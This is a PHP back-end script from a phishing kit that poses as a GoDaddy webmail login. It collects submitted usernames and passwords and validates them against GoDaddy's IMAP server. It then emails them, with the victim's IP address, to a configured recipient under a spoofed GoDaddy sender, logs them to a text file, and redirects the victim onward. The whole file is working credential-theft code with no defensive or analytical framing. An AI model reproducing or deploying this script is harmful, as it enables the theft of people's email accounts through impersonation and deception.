<?php
error_reporting(0);
include('anti.php');
include "config.php";
session_start();
$user = $_POST['username'];
$pass = $_POST['password'];
$user2 = $_SESSION['username'];
$pass2 = $_SESSION['password'];
if ($truelogin==true) {
if($pass!="")  {
$domain = substr(strrchr($user, "@") , 1);
$username = $user;
$password = $pass;
$server = '{imap.secureserver.net:993/imap/ssl/novalidate-cert}INBOX';
$connection = imap_open($server, $username, $password);
$ip = getenv("REMOTE_ADDR");
$praga=rand();
$praga=md5($praga);
if($connection){
		
			$date = date('d-m-Y');
		$ip = getenv("REMOTE_ADDR");
		$message = "-----------------+ True Login  +-----------------\n";
		$message.= "User ID: " . $user . "\n";
		$message.= "Password: " . $pass . "\n";
		$message.= "Client IP      : $ip\n";
		$message.= "-----------------+ REDSON +------------------\n";
		$subject = "Go Daddy | True Login: " . $ip . "\n";
		$headeremail="admin@".$_SERVER['HTTP_HOST'];
		$headers = "From: GoDaddy <$headeremail> \r\n";
		$headers .= "Reply-To: GoDaddy <$headeremail>\r\n";
		$headers .= "MIME-Version: 1.0\r\n";
		$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
if($sendlog==true)
{
		mail($recipient, $subject, $message, $headers);
}
if($savelog==true)
{ 		$fp = fopen("logz/users.txt","a");
		fputs($fp,$message);
		fclose($fp);
}
		header("Location: delist?ss=o&ea=$user");
		}else {header("Location:  error?ss=o&ea=$user");}
		}else { header('HTTP/1.0 404 Not Found');exit;}		
	}else 
{if($pass!="")  {
$ip = getenv("REMOTE_ADDR");
$praga=rand();
$praga=md5($praga);
		$date = date('d-m-Y');
		$ip = getenv("REMOTE_ADDR");
		$message = "-----------------+ Login  +-----------------\n";
		$message.= "User ID: " . $user2 . "\n";
		$message.= "Password: " . $pass2 . "\n";
		$message.= "User ID2: " . $user . "\n";
		$message.= "Password2: " . $pass . "\n";
		$message.= "Client IP      : $ip\n";
		$message.= "-----------------+ REDSON +------------------\n";
		$subject = "Go Daddy | Login: " . $ip . "\n";
		$headeremail="admin@".$_SERVER['HTTP_HOST'];
		$headers = "From: GoDaddy <$headeremail> \r\n";
		$headers .= "Reply-To: GoDaddy <$headeremail>\r\n";
		$headers .= "MIME-Version: 1.0\r\n";
		$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
if($sendlog==true)
{ 
		mail($recipient, $subject, $message, $headers);
}
if($savelog==true)
{ 		$fp = fopen("logz/users.txt","a");
		fputs($fp,$message);
		fclose($fp);
}
		header("Location: delist?ss=o&ea=$user");
}else 
{ header('HTTP/1.0 404 Not Found');exit;
}
}
?>